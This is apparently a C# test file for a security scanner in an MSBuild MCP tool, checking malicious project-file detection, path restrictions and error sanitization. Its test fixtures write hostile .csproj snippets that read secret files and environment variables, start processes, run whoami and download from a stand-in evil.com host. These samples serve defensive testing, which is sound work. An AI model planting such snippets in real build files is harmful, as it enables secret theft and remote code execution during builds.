using MsBuildGraphMcp.Tools;

namespace MsBuildGraphMcp.Tests;

/// <summary>
/// Tests for SecurityScanner: XML pre-scan, allowed paths, error sanitization.
/// Every security boundary must be tested.
/// </summary>
public class SecurityScannerTests
{
    // --- Pre-scan: dangerous property functions ---

    [Fact]
    public void ScanProjectFile_WithFileReadAllText_DetectsWarning()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"sec-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        try
        {
            File.WriteAllText(Path.Combine(dir, "Bad.csproj"),
@"<Project Sdk=""Microsoft.NET.Sdk"">
  <PropertyGroup>
    <Secret>$([System.IO.File]::ReadAllText('C:\secret.txt'))</Secret>
  </PropertyGroup>
</Project>");

            var warnings = SecurityScanner.ScanProjectFile(Path.Combine(dir, "Bad.csproj"));

            Assert.NotEmpty(warnings);
            Assert.Contains(warnings, w => w.Contains("System.IO.File") && w.Contains("[SECURITY]"));
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void ScanProjectFile_WithEnvironmentGetEnv_DetectsWarning()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"sec-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        try
        {
            File.WriteAllText(Path.Combine(dir, "Env.csproj"),
@"<Project Sdk=""Microsoft.NET.Sdk"">
  <PropertyGroup>
    <Key>$([System.Environment]::GetEnvironmentVariable('SECRET_KEY'))</Key>
  </PropertyGroup>
</Project>");

            var warnings = SecurityScanner.ScanProjectFile(Path.Combine(dir, "Env.csproj"));

            Assert.NotEmpty(warnings);
            Assert.Contains(warnings, w => w.Contains("System.Environment"));
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void ScanProjectFile_WithProcessStart_DetectsWarning()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"sec-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        try
        {
            File.WriteAllText(Path.Combine(dir, "Proc.csproj"),
@"<Project Sdk=""Microsoft.NET.Sdk"">
  <PropertyGroup>
    <X>$([System.Diagnostics.Process]::Start('calc.exe'))</X>
  </PropertyGroup>
</Project>");

            var warnings = SecurityScanner.ScanProjectFile(Path.Combine(dir, "Proc.csproj"));

            Assert.NotEmpty(warnings);
            Assert.Contains(warnings, w => w.Contains("System.Diagnostics"));
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void ScanProjectFile_WithNetWebClient_DetectsWarning()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"sec-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        try
        {
            File.WriteAllText(Path.Combine(dir, "Net.csproj"),
@"<Project Sdk=""Microsoft.NET.Sdk"">
  <PropertyGroup>
    <X>$([System.Net.WebClient]::new().DownloadString('http://evil.com'))</X>
  </PropertyGroup>
</Project>");

            var warnings = SecurityScanner.ScanProjectFile(Path.Combine(dir, "Net.csproj"));

            Assert.NotEmpty(warnings);
            Assert.Contains(warnings, w => w.Contains("System.Net"));
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void ScanProjectFile_CleanProject_NoWarnings()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"sec-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        try
        {
            File.WriteAllText(Path.Combine(dir, "Clean.csproj"),
@"<Project Sdk=""Microsoft.NET.Sdk"">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <OutputType>Library</OutputType>
  </PropertyGroup>
</Project>");

            var warnings = SecurityScanner.ScanProjectFile(Path.Combine(dir, "Clean.csproj"));

            Assert.Empty(warnings);
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void ScanProjectFile_WithCodeTaskFactory_DetectsWarning()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"sec-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        try
        {
            File.WriteAllText(Path.Combine(dir, "Task.csproj"),
@"<Project Sdk=""Microsoft.NET.Sdk"">
  <PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup>
  <UsingTask TaskName=""Evil"" TaskFactory=""CodeTaskFactory"" AssemblyFile=""$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll"">
    <Task><Code>Console.WriteLine(""pwned"");</Code></Task>
  </UsingTask>
</Project>");

            var warnings = SecurityScanner.ScanProjectFile(Path.Combine(dir, "Task.csproj"));

            Assert.Contains(warnings, w => w.Contains("CodeTaskFactory"));
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void ScanProjectFile_WithExecTask_DetectsWarning()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"sec-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        try
        {
            File.WriteAllText(Path.Combine(dir, "Exec.csproj"),
@"<Project Sdk=""Microsoft.NET.Sdk"">
  <PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup>
  <Target Name=""Run""><Exec Command=""whoami"" /></Target>
</Project>");

            var warnings = SecurityScanner.ScanProjectFile(Path.Combine(dir, "Exec.csproj"));

            Assert.Contains(warnings, w => w.Contains("<Exec>"));
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void ScanProjectFile_NonExistentFile_NoException()
    {
        var warnings = SecurityScanner.ScanProjectFile(@"C:\nonexistent\fake.csproj");
        Assert.Empty(warnings); // graceful, no throw
    }

    [Fact]
    public void ScanProjectFile_WarningIncludesLineNumber()
    {
        var dir = Path.Combine(Path.GetTempPath(), $"sec-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        try
        {
            File.WriteAllText(Path.Combine(dir, "Line.csproj"),
                "<Project>\n<PropertyGroup>\n<X>$([System.IO.File]::Exists('x'))</X>\n</PropertyGroup>\n</Project>");

            var warnings = SecurityScanner.ScanProjectFile(Path.Combine(dir, "Line.csproj"));

            Assert.NotEmpty(warnings);
            Assert.Contains(warnings, w => w.Contains(":3")); // line 3
        }
        finally { Directory.Delete(dir, true); }
    }

    // --- Allowed paths ---

    [Fact]
    public void CheckAllowedPath_NoEnvVar_AllowsEverything()
    {
        // When MSBUILD_MCP_ALLOWED_PATHS is not set, everything is allowed
        // We can't unset it in a running process reliably, but the default is null → allow all
        // This test verifies the API contract
        var result = SecurityScanner.CheckAllowedPath(@"C:\any\path\file.sln");
        // If env var is not set (default), should return null (allowed)
        // If env var IS set in test env, result may be non-null — that's also correct
        Assert.True(result == null || result.Contains("allowed"),
            "Should either allow (null) or explain restriction");
    }

    // --- Error sanitization ---

    [Fact]
    public void SanitizeErrorMessage_StripsUserProfile()
    {
        var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        var message = $"Error loading {userProfile}\\secret-project\\app.csproj";

        var sanitized = SecurityScanner.SanitizeErrorMessage(message);

        Assert.DoesNotContain(userProfile, sanitized);
        Assert.Contains("~", sanitized);
        Assert.Contains("secret-project", sanitized); // relative part preserved
    }

    [Fact]
    public void SanitizeErrorMessage_StripsStackTrace()
    {
        var message = "Something failed\n   at System.IO.File.ReadAllText()\n   at MyApp.Program.Main()";

        var sanitized = SecurityScanner.SanitizeErrorMessage(message);

        Assert.DoesNotContain("at System.IO", sanitized);
        Assert.Contains("Something failed", sanitized);
    }

    [Fact]
    public void SanitizeErrorMessage_PreservesActionableInfo()
    {
        var message = "Project 'MyLib.csproj' has invalid TFM: net99.0";

        var sanitized = SecurityScanner.SanitizeErrorMessage(message);

        Assert.Equal(message, sanitized); // no change needed
    }

    // --- Input length validation ---

    [Fact]
    public void ValidateSolutionPath_VeryLongPath_Throws()
    {
        var longPath = @"C:\" + new string('a', 600) + ".sln";
        Assert.Throws<ArgumentException>(() => Helpers.ValidateSolutionPath(longPath));
    }

    [Fact]
    public void ValidateProjectPath_VeryLongPath_Throws()
    {
        var longPath = @"C:\" + new string('a', 600) + ".csproj";
        Assert.Throws<ArgumentException>(() => Helpers.ValidateProjectPath(longPath));
    }

    [Fact]
    public void ValidateEntryPath_VeryLongPath_Throws()
    {
        var longPath = @"C:\" + new string('a', 600) + ".sln";
        Assert.Throws<ArgumentException>(() => Helpers.ValidateEntryPath(longPath));
    }

    // --- Timeout config ---

    [Fact]
    public void GraphTimeout_HasReasonableDefault()
    {
        // Default should be 120 seconds when env var is not set
        Assert.True(Helpers.GraphTimeout.TotalSeconds >= 30,
            $"Timeout too short: {Helpers.GraphTimeout.TotalSeconds}s");
        Assert.True(Helpers.GraphTimeout.TotalSeconds <= 600,
            $"Timeout too long: {Helpers.GraphTimeout.TotalSeconds}s");
    }
}
